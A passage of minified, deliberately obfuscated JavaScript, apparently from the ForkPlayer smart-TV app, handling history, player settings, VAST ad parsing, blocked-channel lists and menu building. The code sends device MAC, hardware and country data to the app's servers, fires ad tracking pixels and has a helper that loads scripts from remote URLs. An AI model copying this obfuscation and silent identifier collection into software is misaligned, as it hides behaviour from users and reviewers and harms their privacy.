var x=c.history[n];if(gV(x,"url")==""){c.history.pop();c.navigateHist()}else{if(k==-1&&c.lIQ0Il1IlIb1Il1OYpr=="")c.lIQ0Il1IlIb1Il1OYpr=x.url;var CI=x.url.split("#submenu")[0];if(CI==kjtYpr.l01IlDLcE110l10Ypr)kjtYpr.Password="";breakScreen(getInfoUrl(x.url));var ch={"title":x.title,"logo_30x30":x.img,"stream_url":x.url.replace("#stream_url",""),"playlist_url":"","parser":gV(x,"p"),"local":gV(x,"l"),"mb_parser":gV(x,"mp")};if(typeof prev[CI]=="object"){if(gV(prev[CI],"cacheinfo")=="nocache"||refresh){console.log("del");delete(prev[CI])}else if(c.lIQ0Il1IlIb1Il1OYpr.indexOf("#submenu")>0){if(gV(prev[CI],"url")=="")prev[CI].url=getInfoUrl(x.url)}
var nO=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(prev[CI]));if(nO!=null&&x.url.match(/^(http|searchEngines|view-source:)/)){goBack=!0;console.log("prev goBack");c.page=FXMLPage.create();c.page.typeSource="cache";c.page.count=-1;c.page.lIQ0Il1IlIb1Il1OYpr=c.page.SAVE_lIQ0Il1IlIb1Il1OYpr=x.url;c.isLoading=0;c.page.channels=[];c.page.global={};nO.returnSelect=gV(x,"s");nO.returnTop=gV(x,"top");if(typeof nO.setcookie!="undefined")delete nO.setcookie;console.log(nO);var pq={"elCh":ch,"data":nO,"mode":null,"lI1101I0v1OO1OIYpr":c,"goBack":goBack};c.page.toChannels(pq);if(x.url.indexOf("extensions://")==0){$_("ext").style.display="block";ext_focus()}
c.save();return}}
if(x.url.indexOf("#stream_url")>0){console.log("Load stream");if(is_hdgo(x.url))ch.menu_url="hdgo";console.log(ch);norek=!0;c.navigate(ch)}else{if(refresh){x.s=getSelect();var mode="refresh"}else mode=null;c.navigate({"title":x.title,"defaultSelect":gV(x,"s"),"logo_30x30":x.img,"playlist_url":x.url,"parser":gV(x,"p"),"local":gV(x,"l"),"mb_parser":gV(x,"mp"),"stream_url":""},mode,!0)}
c.save()}}},getTitle:function(n){var c=this;var t=c.get("title").replace(/<.*?>/g,"").replace(/'/g,"");if(c.loadPage!=null&&ll0l0loMtIlIOYpr(c.get("url"))){if(c.isLoading)return c.loadPage.lIQ0Il1IlIb1Il1OYpr}
if(t=="")t=c.get("url");if(c.is_private)t="*"+t;return t},getIcon:function(n){var image=this.get("img").replace(/<.*?>/g,"").replace(/'/g,"");if(image==""){for(var j=this.history.length-2;j>=0;j--){if(ll0l0loMtIlIOYpr(this.history[j].url)){if(image=="")image="none";break}
if(this.history.img!=""){image=gV(this.history[j],"img");break}}}
return image},save:function(s){if(this.is_private)return;if(s==null)s=this.history;kjtYpr.lll0Il11OxICbl1ll0Ypr("url"+this.id,llIl1I1HlMgNII1IO0Ypr(s))},get:function(v,k){if(k==null)k=-1;var n=this.history.length+k;if(typeof this.history[n]=='undefined')return"";else if(v==null)return this.history[n];else return gV(this.history[n],v)},put:function(name,v,k){if(k==null)k=-1;var n=this.history.length+k;if(typeof this.history[n]!='undefined'){this.history[n][name]=v;this.save()}},loadHist:function(s){var c=this;if(s==null)s=kjtYpr.l1O0l1gmmv01O11Ypr("url"+this.id);this.history=l0QO11lOz0bfh10l0Ypr(s);if(this.history==null)this.history=[];if(c.history.length==0)c.history.push({"url":kjtYpr.l01IlDLcE110l10Ypr,"title":"_FPDobroPozhalovat_","icon":"none"});c.title=c.getTitle();c.icon=c.getIcon()},};var wdtimer=null,glSec=0,video=null,ll00llb0Uvh0Q0IOYpr=0,dns_url='',old_select=0,old_p=0,l11II1_JfwgOlIl1Ypr="",select=0,count=0,pstream=!1;Password="",avideo="",margin=0,lIO1OIOlAQzl1Ol1lYpr="",handler="menu",prev={},version="",inftimer=null,sQual=[1080,720,480,360,240],sPlayer={"tizen":"Tizen _FPpleer_","download":"_FPVstroenniy_ _FPpleer_","manual":"System media player...","vimu":"Vimu player","ifrhtml5":"Iframe HTML5 _FPpleer_","html5":"HTML5 _FPpleer_","media":"_FPMedia_ _FPpleer_","ext":"_FPVneshniy_ _FPpleer_","exthtml5":"_FPVneshniy_ HTML5 _FPpleer_","extmedia":"_FPVneshniy_ _FPMedia_ _FPpleer_","jw":"JW Player 8.20.1"},sIconPlayer={"tizen":"tizen.png","download":"vstrpleer.png","manual":"","vimu":"","ifrhtml5":"ifrhtml5.png","html5":"html5.png","media":"media.png","ext":"","exthtml5":"","extmedia":"","jw":"jw.png"};var a=[],stat=b="",prevlite={},lIOO01vuII1IQIYpr="",ll1IQONgLQ00IlllYprtimer=null,sNext=["","_FPPosledovatelno_","_FPPovtoryat_ _FPodin_","_FPPovtoryat_ _FPvse_","_FPOtkl_"];var fons=[];var col="#EEEEEE|#FFFFCC|#FFFF99|#FFFF66|#FFFF33|#FFFF00|#CCCC00|#FFCC66|#FFCC00|#FFCC33|#CC9900|#CC9933|#996600|#FF9900|#FF9933|#CC9966|#CC6600|#996633|#663300|#FFCC99|#FF9966|#FF6600|#CC6633|#993300|#660000|#FF6633|#CC3300|#FF3300|#FF0000|#CC0000|#990000|#FFCCCC|#FF9999|#FF6666|#FF3333|#FF0033|#CC0033|#CC9999|#CC6666|#CC3333|#993333|#990033|#330000|#FF6699|#FF3366|#FF0066|#CC3366|#996666|#663333|#FF99CC|#FF3399|#FF0099|#CC0066|#993366|#660033|#FF66CC|#FF00CC|#FF33CC|#CC6699|#CC0099|#990066|#FFCCFF|#FF99FF|#FF66FF|#FF33FF|#FF00FF|#CC3399|#CC99CC|#CC66CC|#CC00CC|#CC33CC|#990099|#993399|#CC66FF|#CC33FF|#CC00FF|#9900CC|#996699|#660066|#CC99FF|#9933CC|#9933FF|#9900FF|#660099|#663366|#9966CC|#9966FF|#6600CC|#6633CC|#663399|#330033|#CCCCFF|#9999FF|#6633FF|#6600FF|#330099|#330066|#9999CC|#6666FF|#6666CC|#666699|#333399|#333366|#3333FF|#3300FF|#3300CC|#3333CC|#000099|#000066|#6699FF|#3366FF|#0000FF|#0000CC|#0033CC|#000033|#0066FF|#0066CC|#3366CC|#0033FF|#003399|#003366|#99CCFF|#3399FF|#0099FF|#6699CC|#336699|#006699|#66CCFF|#33CCFF|#00CCFF|#3399CC|#0099CC|#003333|#99CCCC|#66CCCC|#339999|#669999|#006666|#336666|#CCFFFF|#99FFFF|#66FFFF|#33FFFF|#00FFFF|#00CCCC|#99FFCC|#66FFCC|#33FFCC|#00FFCC|#33CCCC|#009999|#66CC99|#33CC99|#00CC99|#339966|#009966|#006633|#66FF99|#33FF99|#00FF99|#33CC66|#00CC66|#009933|#99FF99|#66FF66|#33FF66|#00FF66|#339933|#006600|#CCFFCC|#99CC99|#66CC66|#669966|#336633|#003300|#33FF33|#00FF33|#00FF00|#00CC00|#33CC33|#00CC33|#66FF00|#66FF33|#33FF00|#33CC00|#339900|#009900|#CCFF99|#99FF66|#66CC00|#66CC33|#669933|#336600|#99FF00|#99FF33|#99CC66|#99CC00|#99CC33|#669900|#CCFF66|#CCFF00|#CCFF33|#CCCC99|#666633|#333300|#CCCC66|#CCCC33|#999966|#999933|#999900|#666600|#FFFFFF|#CCCCCC|#999999|#666666|#333333|#000000";var f_cols=col.split("|");var f_font="LG Display|Calibri|Arial|Times New Roman|Courier New|Georgia|Trebuchet MS".split("|");var FileObj={},startX=9,minimize=!1,oldselect=0;var vk_cmd,vk_offset,vk_audio_pl=[],vk_audio_sel=0,l0I110IO1SyqII1lI1Ypr=!1;var iptv_retry=0,is_iptv=0,epg_select=-5,epg_channels=[],epg_arr={},epg_src="",epg_src2="",epg_last=0,epg_tl="",epg_tx="",epg_ch=null,epg_region="",epg_timer=null,title_pad=0,lOl10OxfIOI0llYpr=22;var ll001OOlI0HlGIO1OYpr="obovse.ru",info_mode=0,plmini_on=!1,ordered=null,plmini_timer,plmini_canplay=!0,nv_reload=!0,remote_version=0;var tscreen="main",tgame="",payd={};var chGroup=[],chGroupSel=0,cmdReload=!1,spider_stat="";var aborted=!1,templic=0;var baseurl={};var rek_num=0,rek_played=0,country="",apijsUrl="",apijsSend=0,whitestripes=0,device_id="",device_token="",client_id="";var epg_time=0,supportWebOS=!1,llQOIO10IiuQlOl0Ypr={},seSt=[],stSend=null;var l1OII11MlI01IYpr=[],enteresObj=[];llOII1OOGQQO00OYpr=37;lOO0IIlmo1l0IOlOYpr=4;ch_size=29;if(typeof ttmac=="undefined")var ttmac=!1;var tmac=";lg3166589601;lg1539962599;309c23abaf66;641cb0dc4145;b8347510748e;pc1539962447;f46d04148b88;001a791e43d4;84119e2bd1bc;9e411ecc394acbbe;ph1539962159;525400123456";lII1lOMupv1010Ypr=29;var sidB=0,sidW=35;tpadding=1,rek_last=0,rek_q=0,rek_n=0;rek_interval=2*3600*1000;var vk_repeat=!1,vk_visual=0,backtimer;var selIconstart=!1,server_load,vr=0,fonLen;var exAll=exPl=exPlV=["html5","media"];var oID="",yfirst=!0,allTimes={},userGrid=null;countries=["Другие","Украина","Россия","Казахстан","Беларусь"];var psize=0;var l1IOI0lu11lO1IYprmode=0,l1IOI0lu11lO1IYprx=1;var iframeExit=0,fullBody=!1,numBack=0,numBack2=-1,screensavertimer=-1,isScreensaver=!1;var indload=0,supportStorage=!0;var blocked_ch=",НТВ,ТНТ,Звезда,Рен ТВ,Россия,Петербург5 канал,Russia Today,Life News,Первый канал,ТВ Центр International,РТР Планета,НТВ Мир,Россия 24,РБК ТВ,История,365 дней,24 Техно,МИР 24,Страна,КХЛ,Сарафан,Совершенно секретно,Время,Музыка Первого,Ocean-TV,Телевизионный дамский клуб,24 Док,STV,Индия ТВ,Здоровое ТВ,Ля-Минор,Drive,Russian Travel Guide,Ретро,Вопросы и ответы,Footschool TV,Психология21,Mini Movie,Православная телекомпания,Look TV,Amazing Life,Ностальгия,Радость моя,ТБН,";var blocked_epg=",rt-doc,rt-doc-rus,rti,lifenews,rtr,vesti,ort,zvezda,zvezda2,zvezda3,zvezda4,zvezda7,tv3,tv3_2,tv3_3,tv3_4,"+"tv3_7,rossiya+2,rossiya+2,rossiya+2,rossiya+4,rossiya+6,"+"rossiya+8,rossiya-hd,rossiya,rentv,rentv2,rentv4,rentv7,ntv,ntv2,ntv3,ntv4,ntv7,ntv-bel,kultura,kultura+2,kultura+4,kultura+7,"+"ort,ort+2,ort+4,ort+6,ort+8,ortint,ort-hd,planeta-ukr,planeta-sng,karusel,karusel+3,karusel+7,"
if(typeof curWidget!="object"){curWidget={}}
if(window.top!==window.window){window.top.location=window.location.href}
var plaginAudio,plaginNavi,naviFirm,plaginTVMW;function lIOI10l0lGIOIl1Ypr(u){var script=document.createElement('script');script.type='text/javascript';script.async=!0;script.src=u;script.onload=function(){};document.getElementsByTagName('head')[0].appendChild(script)}
function fp(text){s=text;if(text.indexOf("_FP")>-1){var regexp=new RegExp("_FP(.*?)_","g");while((ch=regexp.exec(text))!=null){if(typeof _lang[kjtYpr.GL.lang][ch[1]]=='undefined')_lang[kjtYpr.GL.lang][ch[1]]=ch[1];s=s.replace("_FP"+ch[1]+"_",_lang[kjtYpr.GL.lang][ch[1]])}}
return s}
function lI1I1IxFCIh1l01llYpr(id,text,text2){try{if(typeof id=="object")var bid=id;else bid=$_(id);if(bid==null){console.trace();console.log("_inner null id "+id);return}
if(typeof text=="undefined"||text==null)text="";else text=text.toString();if(typeof kjtYpr.GL=="undefined"){var l=kjtYpr.l1O0l1gmmv01O11YprC("lang");if(l!=""&typeof _lang[l]!="undefined")kjtYpr.GL={"lang":l};else kjtYpr.GL={"lang":"ru"}}
if(_lang[kjtYpr.GL.lang]._powered=="translate.yandex.ru"){var k="",v="";for(var i in _lang.ru){if(k!="")k+="\n";if(v!="")v+="\n";k+=_lang.ru[i];v+=i}
lIl0l1OX1vbll1I1IQYprPost("http://obovse.ru/smarttv/api.php?do=translate&lang="+kjtYpr.GL.lang,"v="+v+"&s="+encodeURIComponent(k),"translate");_lang[kjtYpr.GL.lang]._powered="Powered translate.yandex.ru";return}
var s=fp(text);if(platform=="sams")widgetAPI.putInnerHTML(bid,s);else bid.innerHTML=s}catch(e){console.log(id);console.log(text);console.log(e)}}
function l1l11lPdR0I0IYpr(){var xhr=null;xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){}};url='http://'+ll001OOlI0HlGIO1OYpr+'/block.m3u';xhr.open('GET',url,!0);xhr.send()};function l1IlIk0pOwlll0Ypr(){var xhr=null;xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.responseText.indexOf("ok")==-1){setTimeout("l1IlIk0pOwlll0Ypr();",5000)}else{}}};url='http://online.lnka.ru/online.php';xhr.open('GET',url,!0);xhr.send()};console.log("plat"+"form="+platform+" uaJ="+uaJ);var rek_url="rek_on",rek_type="",rek_proto=0;var Point={};function l1lllUlxeIO1O1OYpr_y(url,file_url,type){console.log("rek "+rek_type+" "+url+" "+file_url+" "+type);if(type=="start"){if(url.indexOf("youtube")==-1){rek_url=url;console.log("start youtube rek "+rek_url);var d=box_client+"-"+kjtYpr.mac+"-"+kjtYpr.hardware;Point["start"]="";Point["complete"]=Point["skip"]="";if(rek_url=="http://195.88.208.101/rek_ivi.mp4"){Point["ClickThrough"]="html://http://opera.ivi.ru/?utm_source=ForkPlayer&utm_campaign=Ads";Point["linkTxt"]="Перейти в приложение IVI"}
Point["skipTime"]=10;ll0lIOsIoIIlOlYpr(rek_url);return}
var video_id=url.substr(url.indexOf('=')+1);var url="http://"+ll001OOlI0HlGIO1OYpr+"/smarttv/api.php?do=youtube2&box_client=lg&country="+ipCountry+"&box_mac="+kjtYpr.mac+"&v="+video_id;xhr3=null;xhr3=new XMLHttpRequest();xhr3.onreadystatechange=function(){if(xhr3.readyState==4){console.log(xhr3.responseText);if(xhr3.responseText.indexOf("[")==-1){rek_url="";rek_num++;handler="menu";kjtYpr.l1O0OOzczEvllIOYpr(rek_mode);return}
var data=l0QO11lOz0bfh10l0Ypr(xhr3.responseText);if(typeof data!="object"||data==null){rek_url="";rek_num++;handler="menu";kjtYpr.l1O0OOzczEvllIOYpr(rek_mode)}
kjtYpr.l0O1011I0MAZWd0100lIYpr=data;rek_url=kjtYpr.l0O1011I0MAZWd0100lIYpr[0][1];console.log("start youtube rek "+rek_url);var d=box_client+"-"+kjtYpr.mac+"-"+kjtYpr.hardware;if(rek_type=="youtube"){Point["start"]="";Point["complete"]="";Point["skip"]="";Point["skipTime"]=15}
if(rek_type=="youtube2"){Point["start"]="";Point["skipTime"]=10}
if(rek_type=="advert"){Point["start"]="";Point["skipTime"]=10}
ll0lIOsIoIIlOlYpr(rek_url)}};console.log("xhropen2="+url);xhr3.open('GET',url,!0);xhr3.send()}else if(file_url=="skip"){console.log("toskip");if(typeof url!="undefined"){console.log("img");var myImage=new Image(1,1);myImage.src=url}
if(platform=="android-device")l1llOQI10lW1l_II101Ypr();else easystop();console.log("toskip2");setTimeout("console.log('plch');kjtYpr.l1O0OOzczEvllIOYpr(rek_mode);",500);lIl0l1OX1vbll1I1IQYpr("http://browser.appinfo.su/gstatic.php?do=rek&cid=skip&appid="+rek_type+platform+"&hardware="+kjtYpr.hardware+"&vr="+vr+"&box_server="+nServer+"&box_low="+box_low+"&title="+curCh("title"))}else if(file_url=="half"&&typeof url!="undefined"){var myImage=new Image(1,1);myImage.src=url}}
function l1lllUlxeIO1O1OYpr(url,file_url,type,recurs){if(rek_type=="youtube"||rek_type=="youtube2"||rek_type=="advert")return l1lllUlxeIO1O1OYpr_y(url,file_url,type);if(ttmac){kjtYpr.popUp("rek num="+rek_num+"<br>"+curTime+"/"+totalTime+"<br>"+type+"<br>"+url,300)}
console.log("adv cmd="+file_url);if(type=="start"&&typeof url!="undefined"){var xhr=null;xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){if(is_rek){console.log("l1lllUlxeIO1O1OYpr "+xhr.status);if(xhr.status==200){var s=xhr.responseText.replace(/\n/g,"").replace(/\r/g,"");if(s.indexOf("MediaFiles")>0||s.indexOf("VASTAdTagURI")>0){if(s.indexOf("VASTAdTagURI")>0){s=s.replace(/\[CACHEBUSTING\]/g,_.random(10000000,99999999));s=s.replace(/%7BENCODED_REF_URL%7D/g,encodeURIComponent(document.referrer));regexp=new RegExp("VASTAdTagURI.{1,70}(http.*?)\]","ig");if((items=regexp.exec(s))!=null){console.log("recursion l1lllUlxeIO1O1OYpr "+items[1]);l1lllUlxeIO1O1OYpr(items[1],'','start',!0)}}else{regexp=new RegExp("<MediaFile.*?video.*?((http|//).*?)\]","ig");if((items=regexp.exec(xhr.responseText))!=null){if(items[2]=="//")rek_url="http:"+items[1];else rek_url=items[1];console.log("rek="+rek_url)}else{regexp=new RegExp("<MediaFile.*?type=.image\/.*?>(.*?)<\/MediaFile>","i");if((items=regexp.exec(xhr.responseText))!=null){rek_url=items[1].replace("<![CDATA[","").replace("]]>","");if(rek_url.indexOf("//")==0)rek_url="http:"+rek_url;rek_url="image/"+rek_url;console.log("rek="+rek_url)}}}
regexp=new RegExp("<Impression.*?>(.*?)<\/Impression","ig");if(recurs==null)Point["impression"]=null;while((items=regexp.exec(s))!=null){it=totrim(items[1].replace("<![CDATA[","").replace("]]>",""));if(it.indexOf("//")==0)it="http:"+it;if(Point["impression"]==null)Point["impression"]=it;else if(typeof Point["impression"]=="object")Point["impression"].push(it);else{var tmp=Point["impression"];Point["impression"]=[];Point["impression"].push(tmp);Point["impression"].push(it)}}
console.log("impress");console.log(Point["impression"]);var event=["start","midpoint","firstQuartile","thirdQuartile","complete","close","skip"];for(var i=0;i<event.length;i++){if(recurs==null)Point[event[i]]=null;regexp=new RegExp("<Tracking[^>]*?event=\""+event[i]+"\".*?>(.*?)<\/Tracking","ig");while((items=regexp.exec(s))!=null){it=totrim(items[1].replace("<![CDATA[","").replace("]]>",""));if(it.indexOf("//")==0)it="http:"+it;console.log(event[i]+"="+it);if(Point[event[i]]==null)Point[event[i]]=it;else if(typeof Point[event[i]]=="object")Point[event[i]].push(it);else{var tmp=Point[event[i]];Point[event[i]]=[];Point[event[i]].push(tmp);Point[event[i]].push(it)}}
console.log(event[i]);console.log(Point[event[i]]);if(Point[event[i]]==null){if(rek_type=="citrus"||rek_type=="proto"||rek_type=="user"){}else if(event[i]!="close"&&event[i]!="skip"){if(rek_num==0){rek_url="rek_on";rek_num++}else{rek_url="";rek_num++}
rek_url="";rek_num++;handler="menu";kjtYpr.l1O0OOzczEvllIOYpr(rek_mode);break}}}
Point["linkTxt"]="";var mtc=s.match(/<Extension type=.linkTxt..*?>(.*?)<\/Extension>/);if(mtc!=null)Point["linkTxt"]=mtc[1].replace("<![CDATA[","").replace("]]>","");console.log("linkTxt="+Point["linkTxt"]);Point["skipTime"]=-1;var mtc=s.match(/<Extension.*?skipTime.*?00:00:(.*?)\]/);if(mtc!=null){Point["skipTime"]=parseInt(mtc[1])}else{var mtc=s.match(/skipoffset="00:00:(.*?)"/);if(mtc!=null){Point["skipTime"]=parseInt(mtc[1])}else{var mtc=s.match(/<Extension.*?skipTime.*?00:(.*?)\]/);if(mtc!=null){Point["skipTime"]=parseInt(mtc[1])}}}
Point["Duration"]="";var mtc=s.match(/<Duration>(.*?)<\/Duration>/);if(mtc!=null){var Dtime=mtc[1].replace("<![CDATA[","").replace("]]>","").split(":");var el=parseInt(Dtime[Dtime.length-1]);if(!isNaN(el))
Point["Duration"]=el;el=parseInt(Dtime[Dtime.length-2]);if(!isNaN(el))
Point["Duration"]+=el*60;el=parseInt(Dtime[Dtime.length-3]);if(!isNaN(el))
Point["Duration"]+=el*3600}
console.log("Duration="+Point["Duration"]);Point["ClickThrough"]="";var mtc=s.match(/<ClickThrough>(.*?)<\/ClickThrough>/);if(mtc!=null){Point["ClickThrough"]=mtc[1].replace("<![CDATA[","").replace("]]>","")}
console.log("ClickThrough="+Point["ClickThrough"]);Point["dstUrl"]="";var mtc=s.match(/dstUrl\".*?(.{1,100})\]/);if(mtc!=null){Point["dstUrl"]=mtc[1]}
console.log("skipTime="+Point["skipTime"]);if(s.indexOf("VASTAdTagURI")==-1){ll0lIOsIoIIlOlYpr(rek_url);return}}
if(s.indexOf("VASTAdTagURI")>0){}else if(rek_url==""||rek_url=="rek_on"){if(++rek_n>0){console.log("EMPty 2 rek");is_adult=!1;rek_url="";setTimeout("is_adult=true;console.log('set rek_n=0;');rek_n=0;",45000)}
err_rek()}else{console.log("whaaat rek");ll0lIOsIoIIlOlYpr(rek_url)}}else{err_rek("errrek status "+xhr.status)}}}};console.log("query "+file_url+" "+url);console.log("xhropen="+url);try{xhr.open('GET',url,!0);if(document.location.href.indexOf("/obovse.ru")>0||1){try{xhr.withCredentials=!0}catch(e){}}
xhr.send()}catch(e){console.log(e);err_rek("errrek"+e.message)}}
if(file_url=="half"||file_url=="skip"){if(file_url=="skip"){is_adult=!1;if(Point["start"]!=null){if(Point["impression"]!=null){l1lllUlxeIO1O1OYpr(Point["impression"],"half")}
l1lllUlxeIO1O1OYpr(Point["start"],"half");if(Point["dstUrl"]!=null){l1lllUlxeIO1O1OYpr(Point["dstUrl"],"half")}
Point["start"]=null}}
if(typeof url!="undefined"){if(typeof url=="object"){for(var i=0;i<url.length;i++){console.log("Point url="+url[i]);var myImage=new Image(1,1);myImage.src=url[i]}}else{console.log("Point url="+url);var myImage=new Image(1,1);myImage.src=url}}
if(file_url=="skip"){lIl0l1OX1vbll1I1IQYpr("http://browser.appinfo.su/gstatic.php?do=rek&cid=skip&appid="+rek_type+platform+"&hardware="+kjtYpr.hardware+"&vr="+vr+"&box_server="+nServer+"&box_low="+box_low+"&title="+curCh("title"));rek_url="";if(platform=="android-device")l1llOQI10lW1l_II101Ypr();else easystop();setTimeout("kjtYpr.l1O0OOzczEvllIOYpr(rek_mode);",500)}
return}};var kjtYpr={"PresearChSelected":-1,"Password":"","Password2":"","no_save":!1,"ll0I0OAVu11I01lYpr":"","timeout":15,"channels":[],"menu":[],"global":{},"l0O1011I0MAZWd0100lIYpr":[],"lIQ0Il1IlIb1Il1OYpr":"","extmode":!1,"muted":!1,"rlogo":!0,"Exittrue":0,"inputId":"","build":0,"hm":"","virtual":0,"applyenter":1,"typeSource":"","REQUEST_XML":"","REQUEST_ID":0,"SUBREQUEST_ID":0,"IFRAMES":[],"IFRAME_BACK":0,"lastSearch":"","defaulted":0,"mac":undefined};var DS={"JTVRegion":2,"next":1,"remoteip":"","quality":1,"clear":0,"passwordkey":'',"password":'',"recovery":1,"player":'html5',"streamplayer":'jw',"fon":"","lang":"ru","country":0,"pr":70,"color":0,"search":3,"remote":0,"buffer":2,"ibuffer":15,"third":0,"xmode":0,"Pw":100,"Ph":100,"timeoutiptv":20,"vk_code":"","vk_id":"","vk_token":"","audioplayer":"1","headers":1,"fs":"1","rate":0,"ts":0,"sortiptv":0,"acestream":"","torrserve":"","snow":1,"livesearch":0,"serv":"","pip":0,"sidebar":0,"scrsaver":1,"font":"","adult":0,"time":0,"zoom":"100","keyboard":"","return":0};kjtYpr.setDefault=function(m){console.log("SET DEFAULT");kjtYpr.GL=DS;var ua=navigator.userAgent.toLowerCase();if(document.location.href.indexOf("/workspace/")>0||model=="sonyplaystation")kjtYpr.GL.headers=0;if(box_low2)FsetSetting(12,1);if(platform=="android-device"){kjtYpr.GL.Pw=1280;kjtYpr.GL.Ph=720;kjtYpr.GL.player="media"}
if(uaJ=="lgw2")kjtYpr.GL.player="ifrhtml5";if(platform=="tizen"){kjtYpr.GL.player=kjtYpr.GL.streamplayer="tizen"}else if(platform=="sams"||uaJ.match(/mag|dune/))kjtYpr.GL.player=kjtYpr.GL.streamplayer="media";if(kjtYpr.build>=7)kjtYpr.GL.keyboard="system";kjtYpr.GL.passwordkey="0000";if(m)return;kjtYpr.lll0Il11OxICbl1ll0Ypr("xmodeClear","");console.log("ser="+llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));kjtYpr.lll0Il11OxICbl1ll0Ypr("glsearch","");console.log("set="+kjtYpr.l1O0l1gmmv01O11Ypr("settings"))};var show_cc=!0,arr_nv=[],is_readst=!1;function readSt(getlist){is_readst=!0;var ch=[];try{ch=l0QO11lOz0bfh10l0Ypr(cached.start)["channels"]}catch(e){kjtYpr.popUp("Error get defines list from https://raw.githubusercontent.com/komivp/appinfodl/main/index.js");ch=[]}
if(ch==null)ch=[];console.log("readSt "+getlist);ch.unshift({"source":"spider","title":"_FPConfiguring search_","tvg-shift":"98","logo_30x30":_img("_ST_settings.png"),"playlist_url":"cmdSetSearch","description":"cmdSetSearch"});ch.unshift({"source":"spider","title":"_FPIstoriya_","tvg-shift":"98","logo_30x30":_img("_ST_history.png"),"playlist_url":"cmdHistory","description":"cmdHistory"});ch.unshift({"source":"spider","title":"_FPTop queries_","tvg-shift":"98","logo_30x30":"_ST_search.png","playlist_url":"http://spiderxml.com/topsearch"});ch.unshift({"source":"spider","title":"_FPEnter search query or site URL, playlist XML / M3U_ <img width='"+css_w(22)+"' src='"+_img("_ST_search.png")+"' style='float:right;height:"+css_wh(22)+"px;padding-top:3px;'>","tvg-shift":"99","value":"","search_on":"_FPEnter search query or URL_:","logo_30x30":_img("_ST_search.png"),"playlist_url":"searchEngines","description":"search engine","presearch":"http://omnibox.spiderxml.com/?type=all"});if(kjtYpr.build>=5.5){ch.push({"source":"service","title":"Local Files & Plugins","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"http://remotefo.rk/treeview?host=remotefo.rk/","description":"http://127.0.0.1/treeview"})}else if(kjtYpr.build>=5.1){ch.push({"source":"service","title":"Ace stream torrent plugins","logo_30x30":"_ST_ace_stream.png","playlist_url":"http://remotefo.rk/treeview?pluginacetorrentplay/.xml&host=remotefo.rk/","description":"forkplayer://pluginacetorrentplay/"})}
if(kjtYpr.GL.remote>0||kjtYpr.GL.acestream!="")ch.push({"source":"service","title":"Torrent сайты","logo_30x30":"_ST_ace_stream.png","local":2,"mb_parser":"http://ACE_IP:6878/webui/api/service?method=get_version&format=jsonp&callback=mycallback","menu_url":"1080|remotefork|rfs","playlist_url":"http://p.lnka.ru/torrentsites/?as=md5mbhash","description":"http://p.lnka.ru/torrentsites/"});if(kjtYpr.GL.remote>0){ch.push({"source":"service","title":"RemoteFork DLNA & Plugins","logo_30x30":"_ST_dlna.png","playlist_url":"forkdlna","description":"forkplayer://RemoteFork/"});ch.push({"source":"service","title":"Home media server","tvg-shift":"1","logo_30x30":"_ST_hms.png","playlist_url":"hms","description":"forkplayer://HMS/"})}
if(is_tizen){if(version_local_files>0)ch.push({"source":"service","title":"USB","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"})}else if(platform=="sams"){ch.push({"source":"service","title":"USB<br>_FPPamyatTv_","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"});ch.push({"source":"service","title":"ForkStore<br> App Market","tvg-shift":"1","logo_30x30":"_ST_fstore.png","playlist_url":"http://obovse.ru/smarttv/wlist.php","description":"http://forkplayer.tv/forkstore"})}else if(platform=="tizen")ch.push({"source":"service","title":"ForkStore<br> App Market","tvg-shift":"1","logo_30x30":"_ST_fstore.png","playlist_url":"http://obovse.ru/smarttv/wlist.php?id=apps","description":"http://forkplayer.tv/forkstore"});if(getlist)return ch;for(var z=0;z<ch.length;z++){try{baseurl[ch[z].playlist_url]=ch[z].description}catch(e){}}
console.log(ch);return ch;is_readst=!0}
var homeurl=document.location.href;if(homeurl.indexOf("#")!=-1)homeurl=homeurl.substr(0,homeurl.indexOf("#"));if(homeurl.indexOf("?")!=-1)var fshomeurl=homeurl.substr(0,homeurl.indexOf("?"));else fshomeurl=homeurl;function l0QO11lOz0bfh10l0Ypr(s){try{if(s=="")return null;return JSON.parse(s)}catch(e){return null}}
function llIl1I1HlMgNII1IO0Ypr(s){try{return JSON.stringify(s)}catch(e){return{}}}
var boot=!0;function onElementFocused(e){console.log("andr onElementFocused");console.log(document.activeElement);if(document.activeElement!=document.body)setTimeout("document.activeElement.blur();",50)}
var timestamp=-4,gnxu;kjtYpr.kjtYpj=function(gm){try{if(gm==null){if(platform=="android-device"||uaJ=="android"){}
console.log("---ONLOAD==");$_("main").focus();$_("popUp").style.display="none";console.log("low="+box_low);console.log("low2="+box_low2);setTimeout("getInfoUrl();",5000);if(uaJ=="dune"){stb=$_("dune-api");try{if(!stb.init())kjtYpr.inf("CAN'T INIT DUNE-STB-API!",1500);stb.setColorKey(1)}catch(e){kjtYpr.inf(e.message,4000)}}else if(uaJ=="mag"&&resolution_prefix!=null){console.log("replace css mag 576i");document.getElementsByTagName('body')[0].style.fontFamily="Arial";$_("top").style.fontSize="17px";mag_dop_top="padding-top:3px;"}else if(uaJ=="pa"){}
kjtYpr.series="";if(platform=="sams"){try{var fileSystemObj=new FileSystem();var bValid=fileSystemObj.isValidCommonPath(curWidget.id);if(!bValid){fileSystemObj.createCommonDir(curWidget.id)}}catch(e){console.log(e)}
try{kjtYpr.hardware=document.getElementById("pluginTV").GetProductCode(1)}catch(e){kjtYpr.hardware=""}
